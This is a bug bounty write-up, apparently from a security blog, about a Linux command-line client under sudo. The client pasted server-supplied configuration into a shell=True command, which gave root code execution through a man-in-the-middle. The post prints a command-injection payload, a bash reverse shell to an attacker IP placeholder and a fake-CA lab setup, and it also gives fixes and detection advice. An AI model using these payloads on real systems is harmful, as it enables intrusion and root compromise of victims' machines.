---
title:       "When the server writes your command line: from a config field to root on your laptop"
summary:     "A console tool running under sudo downloaded its configuration from the server and pasted it, verbatim, into a shell call. One semicolon in the right place and the attacker is root. Report accepted and rewarded."
date:        2026-11-11 19:40:00 +0100
lang:        en
ref:         rce-cli-shell-true
permalink:   /en/writeups/server-controlled-config-shell-rce/

severity:    high
cvss:        "8.8"
cvss_vector: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-88"
vuln_class:  "Injection"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Fixed"
reward:      "Rewarded"
tags:        [rce, linux, shell, mitm, root, command-injection, python]

takeaways:
  - "`shell=True` turns a string into a program. If part of that string comes from the network, the server writes your command line."
  - "\"But the attacker needs a MITM\" is not an excuse: if the program's scope contemplates it, it is a precondition, not a barrier."
  - "When a client accepts **options** from a server, you need an allowlist. Filtering odd characters always falls short."
  - "The program's own error message showed me the command it had built. Reading errors slowly is worth more than many payloads."
---

This is the second bug I am publishing, and it is one of those that sticks with you: **the
server literally decides which command your computer runs as root**. No buffer to overflow,
no exotic architecture to understand. Just one programming decision that millions of
scripts get wrong every day.

<div class="warn" markdown="1">
**Everything is anonymised.** The program authorised publication on condition the product
is not identifiable. I have changed the vendor, the kind of application, the hosts, class
and method names and the version numbers. **The mechanism and the bug are exact.**
</div>

## The target, in one sentence

A **Linux command-line tool** that is part of a desktop application. To work it needs
administrator privileges, so it runs under `sudo` — documented and normal in its case: it
has to touch the system's network configuration.

When you ask it to connect, it does this:

1. Asks the vendor's server for the connection parameters.
2. Uses those parameters to build the command that will launch a system binary.
3. Runs that command.

Three steps. The bug lives entirely in the jump from 1 to 3.

## The line that changes everything

Reading the tool's code (it shipped packaged, but it can be extracted) I found the point
where it runs the command:

```python
# libs/helpers.py
def execute_command(cmd):
    process = subprocess.Popen(cmd, shell=True)
    ...
```

<div class="plain" markdown="1">
**In plain words:** `subprocess` is how Python runs programs. It can do it two ways, and
the difference is everything:

- **Without a shell** (`shell=False`): you pass a list — *"run the program `ping`, with the
  argument `8.8.8.8`"*. Python hands it to the operating system as is. If the argument
  contains a semicolon, it is a semicolon; one more character of text.
- **With a shell** (`shell=True`): you pass **a whole sentence** and Python hands it to
  `/bin/sh` to interpret. And the shell does understand the semicolon: it means *"one
  command ends here and another begins"*.

The first option treats your data as data. The second treats it as **code**.
</div>

See for yourself, it takes ten seconds:

```python
import subprocess

target = "8.8.8.8; touch /tmp/i-got-in"

# safe form: the semicolon is just a character in the argument
subprocess.run(["ping", "-c1", target])          # ping fails, nothing created

# unsafe form: the shell interprets the semicolon
subprocess.run(f"ping -c1 {target}", shell=True) # the file appears
```

## And what was it putting inside that string?

The usual question: **where do the pieces of the command come from?** I followed the
construction backwards:

```python
# the client downloads a block of text with the configuration
response = requests.get(f"https://api.example.tld/v2/my/servers/{server_id}/configs")
blob     = response.json()["clientdata"]

# splits it into lines and words, filtering nothing
parameters = parse_config(blob)

# and pastes it into the final command
cmd = "sudo {} {} {}".format(binary, " ".join(parameters), filters)
execute_command(cmd)      # <- shell=True
```

<div class="plain" markdown="1">
**In plain words:** the program asks the server "tell me how to connect". The server
answers with text. The program splits that text into pieces and **pastes them into the
sentence** it is about to run as root. It does not check which options are valid, nor
whether the values contain dangerous characters. Whatever the server says, runs.
</div>

Put another way: **the server has write access to your command line**.

## "But for that you have to be the server"

Exactly, and this is where a lot of people give up. I nearly did too.

For this to fire, the attacker has to answer that HTTPS request: they have to be **in the
middle** of the connection. That is called a man in the middle (MITM), and it sounds like
an impossible condition.

It is not that impossible:

- Public wifi with a preinstalled root certificate (hotels, airports, cafés with a captive
  portal).
- A company laptop with a corporate certificate installed for traffic inspection. That is
  utterly normal and exists in almost every large organisation.
- A compromised intermediate certificate authority — it has happened several times.
- An insider with access to the network provider.

And the decisive bit: **the bug bounty program itself listed it explicitly in scope**, under
*"arbitrary code execution by staging MITM attacks"*. If the program contemplates it, it is
not an excuse not to report: it is a **declared precondition**.

<div class="note" markdown="1">
This matters for anyone starting out. Before dismissing a bug because "it needs an unusual
condition", **read the program's scope**. Many list exactly which preconditions they accept.
If yours is on that list, your finding counts.
</div>

And what turns the precondition into a product flaw: the client **did not check which
certificate** it was accepting beyond the system's normal validation. Another part of the
same product did — it pinned the expected certificate — but this one did not. That
inconsistency was half the report.

## Building the lab

Everything on a disposable virtual machine, playing both roles: attacker and victim.

```bash
# 1 · create my own certificate authority and trust it system-wide
openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
        -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates

# 2 · issue a certificate for the vendor's domain, signed by my CA
#     (in a real attack this comes from the wifi, the corporate proxy or the compromised CA)

# 3 · point the domain at my own machine
echo "127.0.0.1  api.example.tld" | sudo tee -a /etc/hosts

# 4 · run a proxy that forwards EVERYTHING to the real server...
#     ...except the configuration request, which I answer myself
```

<div class="plain" markdown="1">
**In plain words:** I set up a fake server impersonating the vendor's. I forward almost
everything to the real one so the application notices nothing odd: login works, the server
list works, everything normal. **I intercept one single request**: the one carrying the
configuration. That one I answer myself.
</div>

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/01-setup-atacante.png' | relative_url }}"
       alt="Attacker terminal: own CA installed in the system trust store, domain redirected in /etc/hosts and proxy listening on port 443">
  <figcaption>The attacker's setup: own CA trusted, domain redirected and proxy listening.</figcaption>
</figure>
{% endcomment %}

## The payload

The fake server returns the configuration with one poisoned line:

```
cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marker; #
```

Three pieces, each doing a job:

| Piece | What it is for |
|---|---|
| `cipher aes-256-gcm` | Looks like a legitimate configuration option. A quick glance sees nothing odd |
| `; id > /tmp/pwn; touch /tmp/marker` | The **semicolons** close the previous command and open mine |
| `#` | Comments out whatever the program appends afterwards, so it does not get in the way |

<div class="plain" markdown="1">
**In plain words:** the program was going to run `sudo binary --options...`. My text slips
into the middle, the semicolon cuts the sentence there, my commands run, and the hash makes
the shell ignore the rest. It is exactly the same as a SQL injection, except the database
is your operating system.
</div>

## Firing it

The victim types the product's normal, documented command. One. The one they would type any
day.

And then something happened that I did not expect and that improved the report: **the
program failed and, on failing, printed the command it had built**.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/02-victima-rce.png' | relative_url }}"
       alt="Victim terminal: the documented command runs and the error message shows the full line with the injected payload">
  <figcaption>The error message shows the exact string the shell had just interpreted. The program gives itself away.</figcaption>
</figure>
{% endcomment %}

<div class="plain" markdown="1">
**In plain words:** the system binary died because the hash left its order half-finished. On
dying, the program printed an error containing the full sentence it had tried to run —
**with my payload inside, in plain sight**. The program's failure is the proof of the
program's failure. That is gold for a report: you do not have to convince anyone of what
happened, the tool shows it.
</div>

And the important bit: the commands **had already run** before the binary died. The shell
interprets the list from left to right.

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/03-verificacion-root.png' | relative_url }}"
       alt="The marker files exist, are owned by root and the contents show uid=0(root), while the user who ran the command is still a normal user">
  <figcaption>The markers exist and belong to <code>root</code>. The person who ran the command was an ordinary user.</figcaption>
</figure>
{% endcomment %}

That is the proof that counts: **the file was created by `uid=0`**, not by the user. And no
connection was established, so the user just saw a connection error and tried again —
firing the payload once more.

## Part two: from "I can run commands" to "I am inside"

A marker in `/tmp` demonstrates the mechanism, but it does not tell a security lead *how
much* it hurts. So I swapped the payload for a **reverse shell**:

```
cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' & id > /tmp/pwn; #
```

<div class="plain" markdown="1">
**In plain words:** instead of creating a file, I tell the victim's computer to open a
connection **towards me** and hand me a console. From then on I type in my terminal and the
commands run on their machine, as root. It is not a metaphor: it is their computer, on my
screen.
</div>

{% comment %} PENDIENTE DE CAPTURA — quita esta linea y la de cierre cuando exista el fichero
<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/04-shell-inversa.png' | relative_url }}"
       alt="Attacker terminal with an interactive session: id returns uid=0(root), whoami returns root, and files in the victim's /root are listed">
  <figcaption>Interactive session as <code>root</code> on the victim's machine. <code>id</code> and <code>whoami</code> leave no doubt.</figcaption>
</figure>
{% endcomment %}

Demonstrating the jump from "I can run a command" to "I have a session" is what turns a
*Medium* into a *High*. Same bug, very different impact in the eyes of whoever triages it.

## The negative control

I repeated **exactly the same thing** changing one single item: the payload for a clean
configuration line.

```
cipher aes-256-gcm
```

Result: no marker files, no connection, no execution. The application connects normally.

<div class="plain" markdown="1">
**In plain words:** if I remove the two semicolons and leave the normal configuration,
absolutely nothing happens. That proves the bug is those characters reaching the shell
unfiltered, and not something else about the setup — not my fake CA, not the proxy, not the
virtual machine.
</div>

## Impact

<div class="impact" markdown="1">
**Impact.** Command execution as **root** on any Linux machine with the client installed,
with the victim performing exactly one action: the command the product itself documents.
The attacker's code runs **before** the connection is established, so it can install
persistence (`authorized_keys`, a scheduled task, a system service) in milliseconds.
Changing the account password achieves nothing: the attacker is no longer in the account,
they are on the machine. The only reliable cleanup is reinstalling the operating system,
and the victim has no reason to suspect it.
</div>

## The fix

Three measures, and all three are needed:

**1. Do not build commands as text.** Pass an argument list:

```python
subprocess.run([binary, "--option", value], shell=False)
```

That way a semicolon inside `value` is a semicolon, not a separator. This alone kills the
attack.

**2. An allowlist of options.** The client must accept **only** the options it needs from
the server, and reject every other line. This matters especially with tools that support
options capable of running programs: if the server can send one of those, no injection is
needed at all.

<div class="plain" markdown="1">
**In plain words:** filtering odd characters is not enough. There are configuration options
that **by design** execute programs. If you accept any option the server sends, the attacker
needs no trick: they send you the legitimate option that runs their program. That is why the
allowlist comes first and the filtering second.
</div>

**3. Pin the server's certificate** on every connection, not just some. Then a foreign CA —
even one the system trusts — is not enough to impersonate the server.

## How to look for this yourself

In any Python code that comes your way:

```bash
grep -rnE 'shell\s*=\s*True|os\.system|os\.popen' .
```

And for each hit, the two questions:

1. **Does any part of that string come from outside?** The network, a file, an environment
   variable, an argument.
2. **Who controls that "outside"?** If the answer includes "a server I can answer for", you
   have it.

The equivalent in other languages: `exec`/`system`/`passthru` in PHP, `child_process.exec`
in Node (versus `execFile`), `Runtime.exec(String)` in Java, backticks in Ruby and Perl. The
pattern is identical everywhere: **a string that ends up in an interpreter**.

<div class="note" markdown="1">
**Only do this where you have permission.** Running a MITM against yourself on your own
virtual machine is a lab. Doing it against someone else's traffic is a crime, and it is not
even necessary: to demonstrate the bug, your own machine and your own account are enough.
</div>
